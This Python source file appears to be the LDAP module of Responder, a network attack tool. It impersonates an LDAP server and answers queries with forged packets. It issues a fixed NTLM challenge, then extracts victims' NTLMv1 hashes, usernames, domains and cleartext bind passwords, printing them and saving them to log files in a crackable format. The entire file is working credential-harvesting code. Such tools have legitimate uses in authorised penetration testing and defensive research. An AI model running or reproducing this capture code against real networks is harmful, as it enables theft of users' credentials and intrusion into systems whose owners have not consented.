import os
import struct
import settings

from SocketServer import BaseRequestHandler
from packets import LDAPSearchDefaultPacket, LDAPSearchSupportedCapabilitiesPacket, LDAPSearchSupportedMechanismsPacket, LDAPNTLMChallenge
from utils import *

def ParseSearch(data):
	Search1 = re.search('(objectClass)', data)
	Search2 = re.search('(?i)(objectClass0*.*supportedCapabilities)', data)
	Search3 = re.search('(?i)(objectClass0*.*supportedSASLMechanisms)', data)

	if Search1:
		return str(LDAPSearchDefaultPacket(MessageIDASNStr=data[8:9]))
	if Search2:
		return str(LDAPSearchSupportedCapabilitiesPacket(MessageIDASNStr=data[8:9],MessageIDASN2Str=data[8:9]))
	if Search3:
		return str(LDAPSearchSupportedMechanismsPacket(MessageIDASNStr=data[8:9],MessageIDASN2Str=data[8:9]))

def ParseLDAPHash(data, client):
	SSPIStart = data[42:]
	LMhashLen = struct.unpack('<H',data[54:56])[0]

	if LMhashLen > 10:
		LMhashOffset = struct.unpack('<H',data[58:60])[0]
		LMHash       = SSPIStart[LMhashOffset:LMhashOffset+LMhashLen].encode("hex").upper()
		
		NthashLen    = struct.unpack('<H',data[64:66])[0]
		NthashOffset = struct.unpack('<H',data[66:68])[0]
		NtHash       = SSPIStart[NthashOffset:NthashOffset+NthashLen].encode("hex").upper()
		
		DomainLen    = struct.unpack('<H',data[72:74])[0]
		DomainOffset = struct.unpack('<H',data[74:76])[0]
		Domain       = SSPIStart[DomainOffset:DomainOffset+DomainLen].replace('\x00','')
		
		UserLen      = struct.unpack('<H',data[80:82])[0]
		UserOffset   = struct.unpack('<H',data[82:84])[0]
		User         = SSPIStart[UserOffset:UserOffset+UserLen].replace('\x00','')
		
		WriteHash    = User+"::"+Domain+":"+LMHash+":"+NtHash+":"+settings.Config.NumChal
		Outfile      = os.path.join(settings.Config.ResponderPATH, 'logs', "LDAP-NTLMv1-%s.txt" % client)

		print text("[LDAP] NTLMv1 Address  : %s" % client)
		print text("[LDAP] NTLMv1 Username : %s\\%s" % (Domain, User))
		print text("[LDAP] NTLMv1 Hash     : %s" % NtHash)
		WriteData(Outfile, WriteHash, User+"::"+Domain)
	
	if LMhashLen < 2 :
		print text("[LDAP] Ignoring anonymous NTLM authentication")

def ParseNTLM(data,client):
	Search1 = re.search('(NTLMSSP\x00\x01\x00\x00\x00)', data)
	Search2 = re.search('(NTLMSSP\x00\x03\x00\x00\x00)', data)

	if Search1:
		NTLMChall = LDAPNTLMChallenge(MessageIDASNStr=data[8:9],NTLMSSPNtServerChallenge=settings.Config.Challenge)
		NTLMChall.calculate()
		return str(NTLMChall)

	if Search2:
		ParseLDAPHash(data,client)

def ParseLDAPPacket(data, client):
	if data[1:2] == '\x84':

		PacketLen        = struct.unpack('>i',data[2:6])[0]
		MessageSequence  = struct.unpack('<b',data[8:9])[0]
		Operation        = data[9:10]
		sasl             = data[20:21]
		OperationHeadLen = struct.unpack('>i',data[11:15])[0]
		LDAPVersion      = struct.unpack('<b',data[17:18])[0]
		
		if Operation == "\x60":

			UserDomainLen  = struct.unpack('<b',data[19:20])[0]
			UserDomain     = data[20:20+UserDomainLen]
			AuthHeaderType = data[20+UserDomainLen:20+UserDomainLen+1]

			if AuthHeaderType == "\x80":
				PassLen  = struct.unpack('<b',data[20+UserDomainLen+1:20+UserDomainLen+2])[0]
				Password = data[20+UserDomainLen+2:20+UserDomainLen+2+PassLen]

				outfile = os.path.join(settings.Config.ResponderPATH, 'logs', "LDAP-Clear-Text-Password-%s.txt" % client)
				WritePass = 'LDAP: %s: %s:%s' % (client, UserDomain, Password)

				if PrintData(outfile, WritePass):
					print text("[LDAP] Client   : %s" % color(client, 3, 0))
					print text("[LDAP] Username : %s" % color(UserDomain, 3, 0))
					print text("[LDAP] Password : %s" % color(Password, 3, 0))
		
					WriteData(outfile, WritePass, WritePass)
			
			if sasl == "\xA3":
				Buffer = ParseNTLM(data,client)
				return Buffer
		
		elif Operation == "\x63":
			Buffer = ParseSearch(data)
			return Buffer
		
		else:
			print '[LDAP]Operation not supported'

# LDAP Server class
class LDAP(BaseRequestHandler):
	def handle(self):
		try:
			while True:
				self.request.settimeout(0.5)
				data = self.request.recv(8092)
				Buffer = ParseLDAPPacket(data,self.client_address[0])

				if Buffer:
					self.request.send(Buffer)
		
		except socket.timeout:
			pass